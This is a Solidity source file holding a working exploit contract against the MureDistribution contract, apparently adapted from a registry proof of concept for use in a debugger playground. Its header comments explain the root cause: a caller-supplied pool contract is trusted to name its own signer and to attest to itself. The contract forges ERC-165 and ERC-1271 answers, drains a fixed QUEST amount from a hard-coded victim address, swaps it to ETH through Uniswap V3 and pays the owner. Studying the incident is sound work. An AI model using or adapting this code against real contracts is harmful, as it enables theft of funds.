// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Synthetic standalone exploit for the EVM Playground (2026-05-MureDistribution).
// Adapted from the real registry PoC (test/MureDistribution_exp.sol). Two
// changes from the real PoC:
//  1. The real PoC runs the whole attack inside the `MureDistributionExploit`
//     constructor, which the recorder cannot step through opcode-by-opcode.
//     Here the attack is moved into an external `attack()` entrypoint, gated
//     on `msg.sender == owner` like the original.
//  2. The real PoC splits the "forged pool/signer/recipient" role into a
//     second, separately-deployed `MureSignerSource` contract. Functionally
//     the split is not required - ERC-1271 self-attestation and the
//     ERC-165 self-declaration work identically whether the attacker uses a
//     second contract or attests about itself directly - so this synthetic
//     version merges everything into ONE contract (deployed as
//     `MureDistributionExploit`, matching `syntheticExploit.contractName`)
//     so the recorder/debugger can resolve every editorial beat against a
//     single deployed address.
//
// Root cause: MureDistribution.distribute() reads BOTH the signature verifier
// (`source.poolState().signer`) AND the ERC-1271 attestation (`signer.isValidSignature`)
// from a single caller-supplied `source` contract, gated only by a self-declared
// ERC-165 `supportsInterface`. An attacker contract that answers all three calls
// about itself becomes simultaneously the "pool", the "signer", and forges its
// own authorization, then pulls `amount` of `token` from `repository` (chosen by
// the attacker) to `to` (also attacker-chosen).

interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract MureDistributionExploit {
    bytes4 internal constant ERC1271_MAGIC_VALUE = 0x1626ba7e;
    bytes4 internal constant ERC165_INTERFACE_ID = 0x01ffc9a7;
    bytes4 internal constant MURE_POOL_INTERFACE_ID = 0x10704b42;

    address internal constant VICTIM = 0x29b0a315924E05aC0c898a63D96daA33CfD1cAc7;
    IMureDistribution internal constant MURE_DISTRIBUTION =
        IMureDistribution(0x365083717eFB17F3895290BA38f20F568C7A4D8a);
    IUniswapV3Router internal constant UNISWAP_V3_ROUTER =
        IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    IERC20Min internal constant QUEST = IERC20Min(0x1Fc122FE8b6Fa6b8598799baF687539b5D3B2783);
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    IWETH internal constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    uint24 internal constant QUEST_USDC_FEE = 10_000;
    uint24 internal constant USDC_WETH_FEE = 500;
    uint256 internal constant DRAINED_QUEST = 4_848_683_803_036;

    address internal immutable owner;

    constructor(address owner_) {
        owner = owner_;
    }

    function attack() external {
        require(msg.sender == owner, "not owner");

        // `source` is this contract itself - it will be asked (below, inside
        // MureDistribution) to self-declare PoolMetadata support, report ITSELF
        // as the pool's `signer`, and then attest via ERC-1271 to its own
        // forged authorization.
        MURE_DISTRIBUTION.distribute(
            IMureDistribution.Distribution({
                token: address(QUEST),
                source: address(this),
                from: VICTIM,
                to: address(this),
                poolId: "quest",
                amount: DRAINED_QUEST,
                deadline: block.timestamp + 1
            }),
            address(this),
            ""
        );

        require(QUEST.approve(address(UNISWAP_V3_ROUTER), type(uint256).max), "QUEST approve failed");
        uint256 wethOut = UNISWAP_V3_ROUTER.exactInput(
            IUniswapV3Router.ExactInputParams({
                path: abi.encodePacked(address(QUEST), QUEST_USDC_FEE, USDC, USDC_WETH_FEE, address(WETH)),
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: QUEST.balanceOf(address(this)),
                amountOutMinimum: 1
            })
        );

        WETH.withdraw(wethOut);
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok, "owner eth transfer failed");
    }

    // Called BY MureDistribution on `source` (this contract) to learn the
    // pool's "signer" - which this attacker answers with its own address.
    function poolState(string calldata)
        external
        view
        returns (uint256, uint256, uint256, uint256, uint256, address, uint256, address)
    {
        return (0, 0, 0, 0, 0, address(QUEST), 0, address(this));
    }

    // Called BY MureDistribution's SignatureChecker as the ERC-1271 fallback,
    // since `signer` above resolved to this same contract. Unconditionally
    // returns the magic value, so an empty signature "verifies".
    function isValidSignature(bytes32, bytes calldata) external pure returns (bytes4) {
        return ERC1271_MAGIC_VALUE;
    }

    // Called BY ERC165Checker.supportsInterface() as the ONLY gate on `source`
    // before MureDistribution trusts it as a pool.
    function supportsInterface(bytes4 interfaceId) external pure returns (bool) {
        return interfaceId == ERC165_INTERFACE_ID || interfaceId == MURE_POOL_INTERFACE_ID;
    }

    receive() external payable {}
}

interface IMureDistribution {
    struct Distribution {
        address token;
        address source;
        address from;
        address to;
        string poolId;
        uint256 amount;
        uint256 deadline;
    }

    function distribute(Distribution calldata distribution, address signer, bytes calldata signature) external;
}

interface IUniswapV3Router {
    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
    }

    function exactInput(ExactInputParams calldata params) external payable returns (uint256 amountOut);
}

interface IWETH is IERC20Min {
    function withdraw(uint256 wad) external;
}
